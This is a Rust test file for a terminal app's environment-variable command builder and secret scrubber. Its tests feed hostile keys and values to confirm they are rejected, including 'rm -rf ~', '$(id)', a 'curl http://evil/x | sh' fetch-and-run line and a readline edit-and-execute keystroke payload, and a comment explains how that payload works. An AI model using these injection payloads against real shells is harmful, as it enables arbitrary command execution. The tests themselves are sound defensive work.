#[cfg(test)]
mod unit_tests {
    use super::super::*;

    #[test]
    fn test_shell_detection() {
        let shells = detect_available_shells();

        assert!(
            !shells.is_empty(),
            "Expected at least one shell to be available"
        );

        for shell in &shells {
            assert!(shell.available);
            assert!(!shell.path.is_empty());
        }
    }

    #[test]
    fn test_default_shell() {
        let default = get_default_shell();

        #[cfg(unix)]
        {
            assert!(matches!(
                default,
                ShellType::Zsh | ShellType::Bash | ShellType::Sh
            ));
        }

        #[cfg(windows)]
        {
            assert!(matches!(default, ShellType::PowerShell | ShellType::Cmd));
        }
    }

    #[test]
    fn test_shell_type_serialization() {
        let shell = ShellType::PowerShell;
        let json = serde_json::to_string(&shell).unwrap();
        assert_eq!(json, r#""powershell""#);

        let deserialized: ShellType = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized, ShellType::PowerShell);
    }

    #[test]
    fn test_cmd_shell_serialization() {
        let shell = ShellType::Cmd;
        let json = serde_json::to_string(&shell).unwrap();
        assert_eq!(json, r#""cmd""#);
    }

    #[test]
    fn test_wsl_shell_serialization() {
        let shell = ShellType::Wsl;
        let json = serde_json::to_string(&shell).unwrap();
        assert_eq!(json, r#""wsl""#);
    }

    #[test]
    fn test_gitbash_shell_serialization() {
        let shell = ShellType::GitBash;
        let json = serde_json::to_string(&shell).unwrap();
        assert_eq!(json, r#""gitbash""#);
    }
}

#[cfg(test)]
mod env_injection_tests {
    use crate::features::terminal::session_manager::{
        get_env_command, scrub_secrets, set_env_command, unset_env_command, validate_env_key,
        validate_env_value,
    };
    use crate::features::terminal::ShellType;

    #[test]
    fn env_key_allowlist_accepts_real_names_and_rejects_metacharacters() {
        assert!(validate_env_key("PATH").is_ok());
        assert!(validate_env_key("_private_1").is_ok());

        for hostile in [
            "X; rm -rf ~",
            "FOO`id`",
            "FOO$(id)",
            "FOO BAR",
            "1FOO",
            "",
            "FOO\nBAR",
            "FOO&whoami",
        ] {
            assert!(
                validate_env_key(hostile).is_err(),
                "expected {:?} to be rejected",
                hostile
            );
        }
    }

    #[test]
    fn set_env_rejects_a_hostile_key_instead_of_shelling_out() {
        assert!(set_env_command(&ShellType::Bash, "X; touch /tmp/pwned #", "v").is_err());
        assert!(set_env_command(&ShellType::PowerShell, "X; rm x", "v").is_err());
        assert!(set_env_command(&ShellType::Cmd, "X&whoami", "v").is_err());
    }

    #[test]
    fn set_env_value_cannot_escape_posix_single_quotes() {
        // Backslash does not escape inside POSIX single quotes, so escaping the
        // quote as \' leaves `; touch ~/pwned` outside the quotes as live shell
        // text; only close-quote/escaped-quote/reopen contains it.
        let command = set_env_command(&ShellType::Bash, "FOO", "a'; touch ~/pwned #").unwrap();
        assert_eq!(command, r#"export FOO='a'"'"'; touch ~/pwned #'"#);
        assert!(!command.contains(r"\'"));

        let tokens = shlex::split(&command).expect("command must tokenize");
        assert_eq!(tokens, vec!["export", "FOO=a'; touch ~/pwned #"]);
    }

    #[test]
    fn set_env_value_cannot_smuggle_a_second_line_into_the_pty() {
        assert!(set_env_command(&ShellType::Bash, "FOO", "a\ntouch /tmp/pwned").is_err());
        assert!(set_env_command(&ShellType::PowerShell, "FOO", "a\r\nrm x").is_err());
    }

    /// Quoting cannot reach these bytes: the value is typed into a LIVE line
    /// editor, which reads control bytes as editing COMMANDS before any shell
    /// parser sees the line. `\x18\x05` is readline's edit-and-execute-command.
    /// it hands the rest of the value to $EDITOR as keystrokes (`cc`, ESC, `ZZ`
    /// in vi) and then EXECUTES the edited buffer. An independent reviewer drove
    /// exactly this payload through a bash PTY and it created the file; it holds
    /// no newline, so the previous validator passed it straight through.
    /// Anything above ASCII is no safer: with readline's `convert-meta` on.
    /// its default whenever the locale is not 8-bit clean, which is what a GUI
    /// app inherits when launched without LANG, each byte arrives as ESC + byte
    /// and reaches meta bindings such as shell-expand-line, which performs
    /// command substitution.
    #[test]
    fn set_env_value_cannot_smuggle_readline_keystrokes() {
        let edit_and_execute = "\u{18}\u{5}cctouch /tmp/pwned\u{1b}ZZ";
        assert!(set_env_command(&ShellType::Bash, "FOO", edit_and_execute).is_err());
        assert!(validate_env_value(edit_and_execute).is_err());

        for rejected in [
            "a\tb",
            "a\u{1b}[200~b",
            "a\u{7f}",
            "a\u{1}b",
            "caf\u{e9}",
            "\u{85}",
        ] {
            assert!(
                set_env_command(&ShellType::Zsh, "FOO", rejected).is_err(),
                "expected {:?} to be rejected",
                rejected
            );
            assert!(set_env_command(&ShellType::PowerShell, "FOO", rejected).is_err());
            assert!(set_env_command(&ShellType::Cmd, "FOO", rejected).is_err());
        }

        assert!(validate_env_value("sk-live-abc_123/+= ~/path").is_ok());
        assert_eq!(
            set_env_command(&ShellType::Bash, "TOKEN", "sk-live-abc_123").unwrap(),
            "export TOKEN='sk-live-abc_123'"
        );
    }

    #[test]
    fn set_env_quotes_per_shell() {
        assert_eq!(
            set_env_command(&ShellType::PowerShell, "FOO", "a'b").unwrap(),
            "$env:FOO='a''b'"
        );
        assert_eq!(
            set_env_command(&ShellType::Cmd, "FOO", "a b").unwrap(),
            "set \"FOO=a b\""
        );
        assert!(set_env_command(&ShellType::Cmd, "FOO", "a%PATH%").is_err());
        assert!(set_env_command(&ShellType::Cmd, "FOO", "a\"&whoami").is_err());
    }

    /// Fish honours `\'` and `\\` inside single quotes, so the POSIX form leaves
    /// a value ending in a backslash unterminated and the prompt hanging on a
    /// continuation line.
    #[test]
    fn set_env_quotes_a_backslash_for_fish() {
        assert_eq!(
            set_env_command(&ShellType::Fish, "FOO", "C:\\").unwrap(),
            "export FOO='C:\\\\'"
        );
        assert_eq!(
            set_env_command(&ShellType::Fish, "FOO", "a'b").unwrap(),
            "export FOO='a\\'b'"
        );
        assert_eq!(
            set_env_command(&ShellType::Bash, "FOO", "C:\\").unwrap(),
            "export FOO='C:\\'"
        );
    }

    #[test]
    fn get_and_unset_env_reject_hostile_keys() {
        assert!(get_env_command(&ShellType::Zsh, "FOO; touch ~/pwned #").is_err());
        assert!(get_env_command(&ShellType::Cmd, "FOO%OTHER%").is_err());
        assert!(unset_env_command(&ShellType::Bash, "FOO; curl http://evil/x | sh #").is_err());
        assert!(unset_env_command(&ShellType::PowerShell, "FOO; rm x").is_err());

        assert_eq!(
            get_env_command(&ShellType::Bash, "FOO").unwrap(),
            "echo $FOO"
        );
        assert_eq!(
            unset_env_command(&ShellType::Bash, "FOO").unwrap(),
            "unset FOO"
        );
    }

    #[test]
    fn scrub_secrets_masks_authorization_headers() {
        assert_eq!(
            scrub_secrets(
                r#"curl -H "Authorization: Bearer sk-live-abc123" https://api.example.com"#
            ),
            r#"curl -H "Authorization: ****" https://api.example.com"#
        );
        assert_eq!(
            scrub_secrets("curl -H 'X-Api-Key: abc123' https://api.example.com"),
            "curl -H 'X-Api-Key: ****' https://api.example.com"
        );
    }

    #[test]
    fn scrub_secrets_masks_user_colon_password_flags() {
        assert_eq!(
            scrub_secrets("curl -u alice:hunter2 https://api.example.com"),
            "curl -u alice:**** https://api.example.com"
        );
    }

    #[test]
    fn scrub_secrets_masks_attached_short_flags_but_keeps_ports() {
        assert_eq!(
            scrub_secrets("mysql -uroot -pSECRET db"),
            "mysql -u**** -p**** db"
        );
        assert_eq!(
            scrub_secrets("docker run -p8080:80 img"),
            "docker run -p8080:80 img"
        );
        assert_eq!(scrub_secrets("mkdir -p /tmp/x"), "mkdir -p /tmp/x");
    }

    #[test]
    fn scrub_secrets_masks_credentials_embedded_in_urls() {
        assert_eq!(
            scrub_secrets("git clone https://alice:ghp_secret@github.com/o/r.git"),
            "git clone https://alice:****@github.com/o/r.git"
        );
        assert_eq!(
            scrub_secrets("git clone https://ghp_secret@github.com/o/r.git"),
            "git clone https://****@github.com/o/r.git"
        );
    }

    #[test]
    fn scrub_secrets_leaves_ordinary_commands_alone() {
        for normal in [
            "ls -la /home/user",
            "git commit -m 'fix auth flow'",
            "curl https://api.example.com/v1/orders",
            "ssh -p 2222 host",
        ] {
            assert_eq!(scrub_secrets(normal), normal);
        }
    }
}

#[cfg(test)]
mod stored_history_tests {
    use crate::features::terminal::session_manager::{rescrub_stored_history, scrub_secrets};

    fn history_db() -> rusqlite::Connection {
        let conn = rusqlite::Connection::open_in_memory().expect("in-memory db");
        conn.execute_batch(
            "CREATE TABLE command_history (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 command TEXT NOT NULL,
                 working_dir TEXT NOT NULL DEFAULT '.',
                 created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                 session_id TEXT
             )",
        )
        .expect("schema");
        conn
    }

    fn stored(conn: &rusqlite::Connection) -> Vec<String> {
        let mut stmt = conn
            .prepare("SELECT command FROM command_history ORDER BY id")
            .expect("select");
        let rows = stmt
            .query_map([], |row| row.get::<_, String>(0))
            .expect("query")
            .filter_map(|row| row.ok())
            .collect();
        rows
    }

    /// F26: scrubbing on write only ever protected rows written after the
    /// scrubber learned a shape. Everything a user typed before that is still in
    /// the sqlite file in cleartext, readable by anything running as them, and
    /// masking it on the way out of `get_command_history` does not touch the
    /// file. The stored text is rewritten instead.
    #[test]
    fn credentials_already_on_disk_are_rewritten_in_place() {
        let conn = history_db();
        for command in [
            r#"curl -H "Authorization: Bearer sk-live-abc123" https://api.example.com"#,
            "mysql -uroot -pSECRET db",
            "git clone https://alice:ghp_secret@github.com/o/r.git",
            "ls -la /home/user",
        ] {
            conn.execute(
                "INSERT INTO command_history (command, working_dir) VALUES (?1, '.')",
                rusqlite::params![command],
            )
            .expect("seed");
        }

        assert_eq!(rescrub_stored_history(&conn).expect("rescrub"), 3);

        let rows = stored(&conn);
        for leaked in ["sk-live-abc123", "SECRET", "ghp_secret"] {
            assert!(
                !rows.iter().any(|row| row.contains(leaked)),
                "{} survived in the stored history: {:?}",
                leaked,
                rows
            );
        }
        assert_eq!(rows[3], "ls -la /home/user");
        for row in &rows {
            assert_eq!(&scrub_secrets(row), row, "a rewritten row is stable");
        }

        assert_eq!(
            rescrub_stored_history(&conn).expect("rescrub"),
            0,
            "the pass is idempotent"
        );
    }
}
